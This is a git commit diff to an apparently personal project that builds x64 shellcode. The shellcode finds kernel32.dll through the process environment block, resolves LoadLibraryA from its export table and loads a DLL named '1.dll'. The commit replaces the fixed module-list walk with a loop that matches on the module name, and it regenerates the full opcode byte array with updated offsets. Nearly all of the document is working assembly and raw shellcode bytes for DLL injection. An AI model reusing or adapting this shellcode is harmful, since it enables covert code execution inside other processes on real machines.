4518cf51c4b1579eac99d8c0704fc92cfa85c4b8
Iamgublin <403760189@qq.com>
2016-11-14 10:25:41 +0800

    11/14

--- Get LoadLibraryA shellcode(x64)/ConsoleApplication3/ConsoleApplication3.cpp
+++ Get LoadLibraryA shellcode(x64)/ConsoleApplication3/ConsoleApplication3.cpp
@@ -14,8 +14,14 @@ push r10
 mov rbx,gs:[60h]            ;get peb   (x86 ÔÚFS¼Ä´æÆ÷£¬x64ÔÚGS¼Ä´æÆ÷)
 mov rbx,[rbx+18h]           ;get ldr
 mov rbx,[rbx+30h]           ;get modulelistfirst ntdll.dll
-mov rbx,[rbx]               ;get kernelbase.dll
+find_kernel32:
 mov rbx,[rbx]               ;get kernel32.dll
+mov rcx,[rbx+40h]
+mov ecx, [rcx + 9h+2h]
+cmp ecx, 32003300h
+jne find_kernel32
+xor ecx,ecx
+find_kernel32_end:
 mov rax,[rbx+10h]           ;get baseaddress
 mov rcx,rax
 mov rbx,[rbx+40h]           ;get basedllname
@@ -72,7 +78,7 @@ pop rax
 pop rbx
 ret
 */
-UCHAR shellcode[203] =
+UCHAR shellcode[217] =
 "\xFC"                                     //0
 "\x53"                                     //1
 "\x50"                                     //2
@@ -85,64 +91,64 @@ UCHAR shellcode[203] =
 "\x48\x8B\x5B\x18"                         //23
 "\x48\x8B\x5B\x30"                         //27
 "\x48\x8B\x1B"                             //30
-"\x48\x8B\x1B"                             //33
-"\x48\x8B\x43\x10"                         //37
-"\x48\x8B\xC8"                             //40
-"\x48\x8B\x5B\x40"                         //44
-"\x48\x33\xDB"                             //47
-"\x8B\x58\x3C"                             //50
-"\x48\x03\xC3"                             //53
-"\x48\x05\x88\x00\x00\x00"                 //59
-"\x48\x33\xDB"                             //62
-"\x8B\x18"                                 //64
-"\x48\x8B\xC1"                             //67
-"\x48\x03\xC3"                             //70
-"\x48\x33\xDB"                             //73
-"\x8B\x58\x1C"                             //76
-"\x8B\x50\x20"                             //79
-"\x48\x8B\xC1"                             //82
-"\x48\x03\xC2"                             //85
-"\x48\x33\xD2"                             //88
-"\x4C\x8B\xC8"                             //91
-"\x4D\x33\xD2"                             //94
-"\x4D\x33\xC0"                             //97
-"\x49\x8B\xC1"                             //100
-"\x42\x8B\x14\x90"                         //104
-"\x48\x8B\xC1"                             //107
-"\x48\x03\xC2"                             //110
-"\x49\xFF\xC2"                             //113
-"\x66\x44\x8B\x40\x0A"                     //118
-"\x66\x41\x81\xF8\x79\x41"                 //124
-"\x75\xE0"                                 //126
-"\x66\x44\x8B\x00"                         //130
-"\x66\x41\x81\xF8\x4C\x6F"                 //136
-"\x75\xD4"                                 //138
-"\x48\x8B\xC1"                             //141
-"\x48\x03\xC3"                             //144
-"\x48\x33\xDB"                             //147
-"\x49\xFF\xCA"                             //150
-"\x42\x8B\x1C\x90"                         //154
-"\x48\x8B\xC1"                             //157
-"\x48\x03\xC3"                             //160
-"\x48\x33\xDB"                             //163
-"\x48\xBB\x31\x2E\x64\x6C\x6C\x00\x00\x00" //173
-"\x48\x83\xEC\x10"                         //177
-"\x48\x89\x1C\x24"                         //181
-"\x48\x8B\xCC"                             //184
-"\xFF\xD0"                                 //186
-"\x48\x83\xC4\x10"                         //190
-"\x41\x5A"                                 //192
-"\x41\x59"                                 //194
-"\x41\x58"                                 //196
-"\x5A"                                     //197
-"\x59"                                     //198
-"\x58"                                     //199
-"\x5B"                                     //200
-"\xC3";                                    //201
-
-
-
- 
+"\x48\x8B\x4B\x40"                         //34
+"\x8B\x49\x0B"                             //37
+"\x81\xF9\x00\x33\x00\x32"                 //43
+"\x75\xEE"                                 //45
+"\x33\xC9"                                 //47
+"\x48\x8B\x43\x10"                         //51
+"\x48\x8B\xC8"                             //54
+"\x48\x8B\x5B\x40"                         //58
+"\x48\x33\xDB"                             //61
+"\x8B\x58\x3C"                             //64
+"\x48\x03\xC3"                             //67
+"\x48\x05\x88\x00\x00\x00"                 //73
+"\x48\x33\xDB"                             //76
+"\x8B\x18"                                 //78
+"\x48\x8B\xC1"                             //81
+"\x48\x03\xC3"                             //84
+"\x48\x33\xDB"                             //87
+"\x8B\x58\x1C"                             //90
+"\x8B\x50\x20"                             //93
+"\x48\x8B\xC1"                             //96
+"\x48\x03\xC2"                             //99
+"\x48\x33\xD2"                             //102
+"\x4C\x8B\xC8"                             //105
+"\x4D\x33\xD2"                             //108
+"\x4D\x33\xC0"                             //111
+"\x49\x8B\xC1"                             //114
+"\x42\x8B\x14\x90"                         //118
+"\x48\x8B\xC1"                             //121
+"\x48\x03\xC2"                             //124
+"\x49\xFF\xC2"                             //127
+"\x66\x44\x8B\x40\x0A"                     //132
+"\x66\x41\x81\xF8\x79\x41"                 //138
+"\x75\xE0"                                 //140
+"\x66\x44\x8B\x00"                         //144
+"\x66\x41\x81\xF8\x4C\x6F"                 //150
+"\x75\xD4"                                 //152
+"\x48\x8B\xC1"                             //155
+"\x48\x03\xC3"                             //158
+"\x48\x33\xDB"                             //161
+"\x49\xFF\xCA"                             //164
+"\x42\x8B\x1C\x90"                         //168
+"\x48\x8B\xC1"                             //171
+"\x48\x03\xC3"                             //174
+"\x48\x33\xDB"                             //177
+"\x48\xBB\x31\x2E\x64\x6C\x6C\x00\x00\x00" //187
+"\x48\x83\xEC\x10"                         //191
+"\x48\x89\x1C\x24"                         //195
+"\x48\x8B\xCC"                             //198
+"\xFF\xD0"                                 //200
+"\x48\x83\xC4\x10"                         //204
+"\x41\x5A"                                 //206
+"\x41\x59"                                 //208
+"\x41\x58"                                 //210
+"\x5A"                                     //211
+"\x59"                                     //212
+"\x58"                                     //213
+"\x5B"                                     //214
+"\xC3";                                    //215
 
 typedef void(*CODE)(void);
 int main()
